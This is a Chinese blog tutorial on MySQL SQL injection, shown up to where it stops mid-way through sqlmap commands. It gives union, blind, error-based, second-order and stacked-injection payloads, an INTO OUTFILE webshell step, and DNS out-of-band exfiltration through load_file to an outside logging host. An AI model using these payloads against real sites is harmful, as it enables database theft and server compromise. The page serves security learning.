<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SQL注入原理及思路（mysql） - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SQL注入原理及思路（mysql）" />
<meta property="og:description" content="数据库知识 mysql数据库 show database; #列出所有数据库 show tables; #列出所有表名 show columns from 表名; #列出表的列 select * from 表名 #查询数据库中某表的信息 select * from 表名 where 列=xx #查询某表中符合列=xx的信息 select * from 表名 order by 数字 #用于将结果集按照某列进行排序（asc 升序desc 降序），在sql注入中通常用来判断前面查询结果集的列数，用于联合union查询 select * from 表名1 union select * from 表名2 #union操作符用于合并两个或多个select语句的结果。但是必须保证前后的select语句必须保证拥有相同数量的列， insert into 表名(`列1`,`列2`,`列3`) values (&#39;值1&#39;,&#39;值2&#39;,&#39;值3&#39;);#给表中添加数据 delete from 表名 where 列=xx;#删除表中数据 update 表名 set 列=xx where 条件;#修改数据 对于mysql5.0以上版本，有数据库information_schema存放数据库所有信息 schemata表（存放所有的数据库）：schema_name列（所有的数据库名） tables表（存放所有的表信息）：table_schema列（数据库名） table_name列（表名） columns表（存放所有的列信息）：table_schema列（数据库名） table_name列（表名）column_name列（列名） select * from 表名 limit 3/limit 0,1; #只有一个参数值时将表中前三条数据列出来；两个参数是从0行开始取1条数据 SQL注入原理 SQL注入有两个前提条件：源码中有执行的sql语句、参数可控且未对参数进行过滤；满足以上两个条件我们就可以任意构造sql语句且执行，从而获取我们想要的信息。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/a1db2ce76ed283bc92b0440ef465d84d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-28T13:46:57+08:00" />
<meta property="article:modified_time" content="2023-10-28T13:46:57+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQL注入原理及思路（mysql）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <div></div> 
<div> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">数据库知识</span></strong></h3> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">mysql数据库</span>
<span style="color:#0077aa;">show</span> <span style="color:#0077aa;">database</span><span style="color:#999999;">;</span> <span style="color:#708090;">#列出所有数据库</span>
<span style="color:#0077aa;">show</span> <span style="color:#0077aa;">tables</span><span style="color:#999999;">;</span> <span style="color:#708090;">#列出所有表名</span>
<span style="color:#0077aa;">show</span> <span style="color:#0077aa;">columns</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名</span><span style="color:#999999;">;</span> <span style="color:#708090;">#列出表的列</span>
<span style="color:#0077aa;">select</span> <span style="color:#9a6e3a;">*</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名 </span><span style="color:#708090;">#查询数据库中某表的信息</span>
<span style="color:#0077aa;">select</span> <span style="color:#9a6e3a;">*</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名 </span><span style="color:#0077aa;">where</span><span style="color:#000000;"> 列</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xx </span><span style="color:#708090;">#查询某表中符合列=xx的信息</span>
<span style="color:#0077aa;">select</span> <span style="color:#9a6e3a;">*</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名 </span><span style="color:#0077aa;">order</span> <span style="color:#0077aa;">by</span><span style="color:#000000;"> 数字 </span><span style="color:#708090;">#用于将结果集按照某列进行排序（asc 升序desc 降序），在sql注入中通常用来判断前面查询结果集的列数，用于联合union查询</span>
<span style="color:#0077aa;">select</span> <span style="color:#9a6e3a;">*</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名</span><span style="color:#990055;">1</span> <span style="color:#0077aa;">union</span> <span style="color:#0077aa;">select</span> <span style="color:#9a6e3a;">*</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名</span><span style="color:#990055;">2</span> <span style="color:#708090;">#union操作符用于合并两个或多个select语句的结果。但是必须保证前后的select语句必须保证拥有相同数量的列，</span>
<span style="color:#0077aa;">insert</span> <span style="color:#0077aa;">into</span><span style="color:#000000;"> 表名</span><span style="color:#999999;">(`</span><span style="color:#000000;">列</span><span style="color:#990055;">1</span><span style="color:#999999;">`,`</span><span style="color:#000000;">列</span><span style="color:#990055;">2</span><span style="color:#999999;">`,`</span><span style="color:#000000;">列</span><span style="color:#990055;">3</span><span style="color:#999999;">`)</span> <span style="color:#0077aa;">values</span> <span style="color:#999999;">(</span><span style="color:#669900;">'值1'</span><span style="color:#999999;">,</span><span style="color:#669900;">'值2'</span><span style="color:#999999;">,</span><span style="color:#669900;">'值3'</span><span style="color:#999999;">);</span><span style="color:#708090;">#给表中添加数据</span>
<span style="color:#0077aa;">delete</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名 </span><span style="color:#0077aa;">where</span><span style="color:#000000;"> 列</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xx</span><span style="color:#999999;">;</span><span style="color:#708090;">#删除表中数据</span>
<span style="color:#0077aa;">update</span><span style="color:#000000;"> 表名 </span><span style="color:#0077aa;">set</span><span style="color:#000000;"> 列</span><span style="color:#9a6e3a;">=</span><span style="color:#000000;">xx </span><span style="color:#0077aa;">where</span><span style="color:#000000;"> 条件</span><span style="color:#999999;">;</span><span style="color:#708090;">#修改数据</span>
<span style="color:#000000;">对于mysql5</span><span style="color:#999999;">.</span><span style="color:#990055;">0</span><span style="color:#000000;">以上版本，有数据库information_schema存放数据库所有信息</span>
<span style="color:#000000;">schemata表（存放所有的数据库）：schema_name列（所有的数据库名）</span>
<span style="color:#0077aa;">tables</span><span style="color:#000000;">表（存放所有的表信息）：table_schema列（数据库名） table_name列（表名）</span>
<span style="color:#0077aa;">columns</span><span style="color:#000000;">表（存放所有的列信息）：table_schema列（数据库名） table_name列（表名）column_name列（列名）</span>
<span style="color:#0077aa;">select</span> <span style="color:#9a6e3a;">*</span> <span style="color:#0077aa;">from</span><span style="color:#000000;"> 表名 </span><span style="color:#0077aa;">limit</span> <span style="color:#990055;">3</span><span style="color:#9a6e3a;">/</span><span style="color:#0077aa;">limit</span> <span style="color:#990055;">0</span><span style="color:#999999;">,</span><span style="color:#990055;">1</span><span style="color:#999999;">;</span> <span style="color:#708090;">#只有一个参数值时将表中前三条数据列出来；两个参数是从0行开始取1条数据</span>
</code></span>
</pre> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">SQL注入原理</span></strong></h3> 
 <p style="margin-left:0;text-align:left;"><span style="color:#333333;">SQL注入有两个前提条件：源码中有执行的sql语句、参数可控且未对参数进行过滤；满足以上两个条件我们就可以任意构造sql语句且执行，从而获取我们想要的信息。</span></p> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">SQL注入思路</span></strong></h3> 
 <h4 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">无任何过滤机制</span></strong></h4> 
 <h5 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">无符号干扰</span></strong></h5> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">针对url中</span><span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;">的思路</span>
<span style="color:#000000;">源码：</span><span style="color:#ee9900;">$id</span><span style="color:#9a6e3a;">=</span><span style="color:#ee9900;">$_GET</span><span style="color:#999999;">[</span><span style="color:#669900;">'id'</span><span style="color:#999999;">]</span> <span style="color:#9a6e3a;">??</span> <span style="color:#669900;">'1'</span><span style="color:#999999;">;</span><span style="color:#ee9900;">$sql</span><span style="color:#9a6e3a;">=</span><span style="color:#669900;">"select * from news where id=$id"</span><span style="color:#999999;">;</span><span style="color:#708090;">//最原始、没有任何过滤的情况</span>
<span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> order by 数字 </span><span style="color:#708090;">//数字从1开始试探，直到页面和之前不一样；用于判断select查询结果的列数</span>
<span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> union select </span><span style="color:#990055;">1</span><span style="color:#999999;">,</span><span style="color:#990055;">2</span><span style="color:#999999;">,</span><span style="color:#990055;">3</span> <span style="color:#708090;">//此处的数字写到上面猜解出的列数;此时查看页面是否返回数字（不返回的话换出id=-1让其报错）</span>
<span style="color:#000000;">当页面报出对应数字之后，我们将其数字改成想要查询内容的函数；数据库版本</span><span style="color:#dd4a68;">version</span><span style="color:#999999;">()</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">判断是否符合information_schema查询（mysql5</span><span style="color:#9a6e3a;">.</span><span style="color:#990055;">0</span><span style="color:#000000;">以上版本有）、当前用户</span><span style="color:#dd4a68;">user</span><span style="color:#999999;">()</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">是否符合root型攻击、当前操作系统@@</span><span style="color:#dd4a68;">version_compile_os</span><span style="color:#999999;">()</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">看是否支持大小写或文件路径选择、查询当前数据库</span><span style="color:#dd4a68;">database</span><span style="color:#999999;">()</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">便于后面猜解该数据库下的表</span>
<span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> union select </span><span style="color:#990055;">1</span><span style="color:#999999;">,</span><span style="color:#990055;">2</span><span style="color:#999999;">,</span><span style="color:#dd4a68;">group_concat</span><span style="color:#999999;">(</span><span style="color:#000000;">table_name</span><span style="color:#999999;">)</span><span style="color:#000000;"> from information_schema</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">tables where table_schema</span><span style="color:#9a6e3a;">=</span><span style="color:#669900;">'数据库名'</span> <span style="color:#708090;">//查询该数据库下的所有表名</span>
<span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> union select </span><span style="color:#990055;">1</span><span style="color:#999999;">,</span><span style="color:#990055;">2</span><span style="color:#999999;">,</span><span style="color:#dd4a68;">group_concat</span><span style="color:#999999;">(</span><span style="color:#000000;">column_name</span><span style="color:#999999;">)</span><span style="color:#000000;"> from information_schema</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">columns where table_schema</span><span style="color:#9a6e3a;">=</span><span style="color:#669900;">"数据库名"</span> <span style="color:#0077aa;">and</span><span style="color:#000000;"> table_name</span><span style="color:#9a6e3a;">=</span><span style="color:#669900;">"表名"</span> <span style="color:#708090;">//查询数据库名下表名中的所有列名</span>
<span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> union select </span><span style="color:#990055;">1</span><span style="color:#999999;">,</span><span style="color:#990055;">2</span><span style="color:#999999;">,</span><span style="color:#669900;">"列名"</span><span style="color:#000000;"> from </span><span style="color:#669900;">"表名"</span><span style="color:#000000;"> limit </span><span style="color:#990055;">0</span><span style="color:#999999;">,</span><span style="color:#990055;">1</span> <span style="color:#708090;">//查询想要的信息</span>

<span style="color:#000000;">如果是root用户具有管理员权限，即可进行跨库查询</span>

<span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> union select </span><span style="color:#990055;">1</span><span style="color:#999999;">,</span><span style="color:#990055;">2</span> <span style="color:#dd4a68;">group_concat</span><span style="color:#999999;">(</span><span style="color:#000000;">schema_name</span><span style="color:#999999;">)</span><span style="color:#000000;"> from information_schema</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">schemata </span><span style="color:#708090;">//查询所有数据库名</span>
<span style="color:#000000;">知道数据库名之后继续按照上面思路一一猜解信息</span>

<span style="color:#000000;">如果是root用户且secure</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">file</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">priv未设置，可进行文件读写</span>

<span style="color:#9a6e3a;">?</span><span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> union select </span><span style="color:#990055;">1</span><span style="color:#999999;">,</span><span style="color:#dd4a68;">load_file</span><span style="color:#999999;">(</span><span style="color:#669900;">'d:\\1.txt'</span><span style="color:#999999;">)</span> <span style="color:#708090;">//读取D盘下文件1.txt内容</span>
<span style="color:#9a6e3a;">?</span><span style="color:#000000;">i</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span><span style="color:#000000;"> union select </span><span style="color:#990055;">1</span><span style="color:#999999;">,</span><span style="color:#669900;">'后门代码'</span><span style="color:#000000;"> into outfile </span><span style="color:#669900;">'d:\\2.txt'</span> <span style="color:#708090;">//如果我们可以把后门代码写入网站目录下则可以直接连接，前提是获取到网络目录（报错显示获取路径、phpinfo页面泄露、利用中间件默认配置文件获取）</span>

<span style="color:#000000;">如果是对引号有过滤的话，我们可以对引号的内容进行十六进制编码绕过。</span>
</code></span>
</pre> 
 <h5 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">有符号干扰 </span></strong></h5> 
 <p style="margin-left:0;text-align:left;"><span style="color:#333333;">上面这种在源码中的id=$id是不带引号的，如果带引号的话我们在每一步之前都要先闭合引号再构造sql语句。</span></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">针对url中?id=</span><span style="color:#000000;">'</span><span style="color:#000000;">1</span><span style="color:#000000;">'</span><span style="color:#000000;">的思路</span>
<span style="color:#000000;">源码：$id=$_GET['id'] ?? '1';$sql="select * from news where id=</span><span style="color:#000000;">'</span><span style="color:#000000;">$id</span><span style="color:#000000;">'</span><span style="color:#000000;">";</span><span style="color:#000000;">/</span><span style="color:#000000;">/</span><span style="color:#000000;">思路同上，就是在id的值后面加一个引号进行闭合，在最后面加一个注释符# --+</span>
<span style="color:#000000;">$id=$_GET['id'] ?? '1';$sql="select * from news where id='</span><span style="color:#000000;">%</span><span style="color:#000000;">$id</span><span style="color:#000000;">%</span><span style="color:#000000;">'"</span><span style="color:#000000;">;</span><span style="color:#000000;">/</span><span style="color:#000000;">/</span><span style="color:#000000;">在id的值后面加上%'闭合，最后加上注释符</span>
<span style="color:#000000;">$id=$_GET['id'] ?? '1';$sql="select * from news where id=('$id')"</span><span style="color:#000000;">;</span><span style="color:#000000;">/</span><span style="color:#000000;">/</span><span style="color:#000000;">在id的值后面加')闭合，最后加注释符</span>
<span style="color:#000000;">$id=$_GET['id'] ?? '1';$sql="select * from news where </span><span style="color:#000000;">(</span><span style="color:#000000;">id='$id')";</span><span style="color:#000000;">/</span><span style="color:#000000;">/</span><span style="color:#000000;">在id的值后面加')闭合，最后加注释符</span>

<span style="color:#000000;">总结：</span>
<span style="color:#000000;">SQL语句由于在黑盒中是无法预知写法的，SQL注入能发成功是需要拼接原SQL语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原SQL语句的未知性导致的拼接失败！</span>

</code></span>
</pre> 
 <h5 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">其它注入点(post、数据包头部信息)</span></strong></h5> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">上面的都是以get提交的注入点，通常只要在源码中存在与数据库交互的地方都有可能存在注入点（post提交的数据、http头等）</span>
<span style="color:#000000;">post表单提交数据：可以使用火狐post提交数据测试，测试思路同get方式，只是这个需要以post提交数据</span>
<span style="color:#000000;">数据包头部</span>
<span style="color:#000000;">use</span><span style="color:#000000;">r</span><span style="color:#000000;">-</span><span style="color:#000000;">a</span><span style="color:#000000;">gent：使得服务器能够识别客户使用的操作系统，浏览器版本等等</span>
<span style="color:#000000;">X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）</span><span style="color:#000000;">；有些网站如果使用的是xff获取我们ip，我们可以通过修改数据包中的xff字段进行绕过ip检测</span>
<span style="color:#000000;">在http头中注入通常都是抓包，然后在数据包中修改头部信息进行尝试注入</span>

</code></span></pre> 
 <p></p> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">SQL盲注</span></strong></h3> 
 <p style="margin-left:0;text-align:left;"><span style="color:#000000;">盲注就是在注入过程中，获取的数据不能回显至前端页面。我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</span></p> 
 <h4 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">基于布尔的盲注</span></strong></h4> 
 <p style="margin-left:0;text-align:left;"><strong><span style="color:#333333;">条件：</span></strong><span style="color:#333333;">该盲注必须有回显，用于判断构造的sql语句是否正确。（通常情况下只有select查询才会有回显，其余的增删改并没有回显）</span></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">在注入点构造sql语句：</span>
<span style="color:#000000;">and</span> <span style="color:#000000;">length(</span><span style="color:#000000;">d</span><span style="color:#000000;">ata</span><span style="color:#000000;">b</span><span style="color:#000000;">ase</span><span style="color:#000000;">(</span><span style="color:#000000;">))=</span><span style="color:#000000;">7</span> <span style="color:#000000;">#</span><span style="color:#000000;">用于判断数据库名称位数，如果猜对页面正常显示，否则页面错误</span>
<span style="color:#000000;">and</span> <span style="color:#000000;">left</span><span style="color:#000000;">(</span><span style="color:#000000;">d</span><span style="color:#000000;">ata</span><span style="color:#000000;">b</span><span style="color:#000000;">ase</span><span style="color:#000000;">(</span><span style="color:#000000;">),1)=</span><span style="color:#000000;">'</span><span style="color:#000000;">d</span><span style="color:#000000;">'</span><span style="color:#000000;">;</span> <span style="color:#000000;">#</span><span style="color:#000000;">用于判断数据库名第一位是否为d</span>
<span style="color:#000000;">and left(database(),</span><span style="color:#000000;">2</span><span style="color:#000000;">)='d</span><span style="color:#000000;">e</span><span style="color:#000000;">'; #用于判断数据库名</span><span style="color:#000000;">前两</span><span style="color:#000000;">位是否为d</span><span style="color:#000000;">e</span>
</code></span></pre> 
 <h4 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">基于时间的盲注-延时判断</span></strong></h4> 
 <p style="margin-left:0;text-align:left;"><strong><span style="color:#333333;">不需要任何条件</span></strong></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;"> 构造sql语句</span>
<span style="color:#000000;">and</span> <span style="color:#000000;">if</span><span style="color:#000000;">(</span><span style="color:#000000;">length(database())=7</span><span style="color:#000000;">,</span><span style="color:#000000;">s</span><span style="color:#000000;">leep(</span><span style="color:#000000;">1</span><span style="color:#000000;">0</span><span style="color:#000000;">),s</span><span style="color:#000000;">leep(</span><span style="color:#000000;">0)) </span><span style="color:#000000;">#</span><span style="color:#000000;">根据是否执行sleep函数判断数据库名字的长度</span>
<span style="color:#000000;">and</span> <span style="color:#000000;">if</span><span style="color:#000000;">(</span><span style="color:#000000;">left(database(),1)='d'</span><span style="color:#000000;">,</span><span style="color:#000000;">s</span><span style="color:#000000;">leep(</span><span style="color:#000000;">1</span><span style="color:#000000;">0</span><span style="color:#000000;">),s</span><span style="color:#000000;">leep(</span><span style="color:#000000;">0</span><span style="color:#000000;">)</span><span style="color:#000000;">) </span><span style="color:#000000;">#</span><span style="color:#000000;">根据sleep函数判断数据库名第一个字符是否为d</span>
<span style="color:#000000;">or if(ord(left(database(),1))=107,sleep(2),0)</span> <span style="color:#000000;">#</span><span style="color:#000000;">107是字母k对应的ASCII码，当存在过滤引号时候可以使用ASCII替换</span>
<span style="color:#000000;">这个时间我们可以通过使用工具bp来判断，在bp的repeater中右下角会显示返回数据包所用时间。</span></code></span></pre> 
 <h4 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">基于报错的盲注</span></strong></h4> 
 <p style="margin-left:0;text-align:left;"><strong><span style="color:#333333;">条件：</span></strong><span style="color:#333333;">有数据库报错处理判断标准</span></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">源码：mysqli_query(</span><span style="color:#000000;">$</span><span style="color:#000000;">con,</span><span style="color:#000000;">$</span><span style="color:#000000;">sql</span><span style="color:#000000;">) </span><span style="color:#000000;">or</span> <span style="color:#000000;">die(</span><span style="color:#000000;">m</span><span style="color:#000000;">ysqli_error(</span><span style="color:#000000;">$</span><span style="color:#000000;">con)</span><span style="color:#000000;">);/</span><span style="color:#000000;">/</span><span style="color:#000000;">关键就是在源码中有输出错误信息</span>
</code></span>
</pre> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">在注入点构造sql语句</span>
<span style="color:#000000;">and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</span> <span style="color:#000000;">/</span><span style="color:#000000;">/</span><span style="color:#000000;">会在页面的报错信息中显示版本</span>
<span style="color:#000000;">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span> 
</code></span></pre> 
 <p></p> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">mysql二次注入</span></strong></h3> 
 <p style="margin-left:0;text-align:left;"><span style="color:#333333;">原理：</span></p> 
 <ol><li style="text-align:left;"><span style="color:#333333;">插入恶意数据，第一次进行数据库插入数据的时候，</span><span style="color:#de3c36;">仅仅对其中的特殊字符进行了转义</span><span style="color:#de3c36;">（addslashes转义函数，转义是关键否则不能造成二次注入）</span><span style="color:#333333;">，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容</span></li><li style="text-align:left;"><span style="color:#333333;">引用恶意数据，在将数据存入到数据库中之后，开发者就认为数据是可信的。在下一次要进行查询的时候，直接从数据库中取出了恶意数据，没有进一步的处理和检验，这样就造成了二次注入。</span></li></ol> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">场景：</span>
<span style="color:#000000;">在我们注册且登陆之后，有修改密码功能，该功能只需要我们输入旧密码和新密码即可；在注册时候可以插入恶意数据，下面语句正常插入的前提是有转义</span>
<span style="color:#000000;">用户名：</span><span style="color:#000000;">admin ' </span><span style="color:#000000;">and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#</span>
<span style="color:#000000;">在修改密码的时候就会执行：</span>
<span style="color:#000000;">select * from </span><span style="color:#000000;">users</span><span style="color:#000000;"> where username='$username' and password='$password</span> <span style="color:#000000;">/</span><span style="color:#000000;">/</span><span style="color:#000000;">此时就会上面</span><span style="color:#000000;">的</span><span style="color:#000000;">用户名待人</span><span style="color:#000000;">该</span><span style="color:#000000;">sql语句执行</span>
</code></span></pre> 
 <p></p> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">堆叠注入</span></strong></h3> 
 <p style="margin-left:0;text-align:left;"><span style="color:#333333;">原理：堆叠注入触发的条件很苛刻，就是在存在注入点的地方通过分号结束符同时执行多条sql语句，例如php中的mysqli_multi_query函数。与之相对应的mysqli_query()只能执行一条SQL，所以要想目标存在堆叠注入,在目标主机存在类似于mysqli_multi_query()这样的函数,根据数据库类型决定是否支持多条语句执行</span></p> 
 <p style="margin-left:0;text-align:left;"><span style="color:#333333;">条件：目标存在sql注入点、目标未对分号进行过滤、目标数据库支持查询信息时执行多条sql语句。（eg：mysql、mssql、postgresql等等）</span></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#990055;">2019</span><span style="color:#000000;">强网杯</span>
<span style="color:#000000;">堆叠注入但是对select过滤，无法直接执行select语句</span>
<span style="color:#000000;">SeT @a</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460</span><span style="color:#999999;">;</span><span style="color:#000000;">prepare execsql from @a</span><span style="color:#999999;">;</span><span style="color:#000000;">execute execsql</span><span style="color:#999999;">;</span> <span style="color:#708090;">//先对要执行的sql查询语句进行十六进制编码，然后赋值给@a</span>

</code></span></pre> 
 <p></p> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">带外查询</span></strong></h3> 
 <p style="margin-left:0;text-align:left;"><span style="color:#333333;">条件：root高权限且支持load_file()；主要解决的是没有回显问题</span></p> 
 <p style="margin-left:0;text-align:left;"><span style="color:#000000;">平台：</span><span style="color:#000000;">http://ceye.io</span></p> 
 <p style="margin-left:0;text-align:left;"><span style="color:#000000;">http://www.dnslog.cn</span></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#708090;">//查询security数据库emails表下第一个列名</span>
<span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span> <span style="color:#0077aa;">and</span> <span style="color:#dd4a68;">load_file</span><span style="color:#999999;">(</span><span style="color:#dd4a68;">concat</span><span style="color:#999999;">(</span><span style="color:#669900;">"\\\\"</span><span style="color:#999999;">,(</span><span style="color:#000000;">select column_name from information_schema</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">columns where table_schema</span><span style="color:#9a6e3a;">=</span><span style="color:#669900;">'security'</span> <span style="color:#0077aa;">and</span><span style="color:#000000;"> table_name</span><span style="color:#9a6e3a;">=</span><span style="color:#669900;">'emails'</span><span style="color:#000000;"> limit </span><span style="color:#990055;">0</span><span style="color:#999999;">,</span><span style="color:#990055;">1</span><span style="color:#999999;">),</span><span style="color:#669900;">".dbuh8a.ceye.io\\xxx.txt"</span><span style="color:#999999;">))</span>

<span style="color:#708090;">//查询字段值  数据库名为security 表名emails 列名id</span>
<span style="color:#000000;">id</span><span style="color:#9a6e3a;">=</span><span style="color:#990055;">1</span> <span style="color:#0077aa;">and</span> <span style="color:#dd4a68;">load_file</span><span style="color:#999999;">(</span><span style="color:#dd4a68;">concat</span><span style="color:#999999;">(</span><span style="color:#669900;">"\\\\"</span><span style="color:#999999;">,(</span><span style="color:#000000;">select id from security</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">emails limit </span><span style="color:#990055;">0</span><span style="color:#999999;">,</span><span style="color:#990055;">1</span><span style="color:#999999;">),</span><span style="color:#669900;">".dbuh8a.ceye.io\\xxx.txt"</span><span style="color:#999999;">))</span>

<span style="color:#000000;">其中xxx</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">txt是随意写的，而</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">dbuh8a</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">ceye</span><span style="color:#9a6e3a;">.</span><span style="color:#000000;">io是带外平台中的dns</span>

</code></span></pre> 
 <p></p> 
 <h3 style="margin-left:0pt;text-align:left;"><strong><span style="color:#1a1a1a;">自动化sql注入工具——sqlmap（基于数据库mysql）</span></strong></h3> 
 <p style="margin-left:0;text-align:left;"></p> 
 <pre><span style="background-color:#fafafa;"><code><span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span>  <span style="color:#708090;">//判断是否有注入点</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">current</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">db </span><span style="color:#708090;">//查看当前数据库 结果acuart</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">current</span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">user </span><span style="color:#708090;">//查看当前用户</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">tables </span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">D</span><span style="color:#000000;"> acuart </span><span style="color:#708090;">//查看当前数据库下所有表</span>
<span style="color:#000000;">sqlmap </span><span style="color:#9a6e3a;">-</span><span style="color:#000000;">u </span><span style="color:#669900;">"http://xxxx?artist=1"</span> <span style="color:#9a6e3a;">--</span><span style="color:#000000;">columns </span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">T</span><span style="color:#000000;"> users </span><span style="color:#9a6e3a;">-</span><span style="color:#990055;">D</span><span style="color:#000000;"> acuart </span><span style="color:#708090;">//查看users表下所有列</span>
